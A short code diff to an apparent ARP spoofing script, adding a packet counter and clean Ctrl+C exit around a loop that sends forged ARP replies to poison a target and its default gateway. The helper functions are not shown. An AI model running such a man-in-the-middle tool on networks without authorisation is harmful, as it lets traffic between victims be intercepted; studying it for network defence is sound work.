@@ -64,14 +64,17 @@ mac_ip_of_gateway = get_mac_ip_of_gateway()
 clear_terminal()
 
 
-
-while True:
-    # Sending Arp Response Packet to poisen default gateway.
-    send_packet(mac_ip_of_target, mac_ip_of_gateway)
-    
-    # Sending Arp Response Packet to poisen target.
-    send_packet(mac_ip_of_gateway,mac_ip_of_target)
-    time.sleep(args.time)
-
-
-
+packet_counter = 0
+try:
+    while True:
+        # Sending Arp Response Packet to poisen default gateway.
+        send_packet(mac_ip_of_target, mac_ip_of_gateway)
+        
+        # Sending Arp Response Packet to poisen target.
+        send_packet(mac_ip_of_gateway,mac_ip_of_target)
+        packet_counter +=2
+        print(f"\rPackets Send: {packet_counter}",end="")
+        print("\nCTRL+C to exit.")
+        time.sleep(args.time)
+except KeyboardInterrupt:
+    print("Exited.")
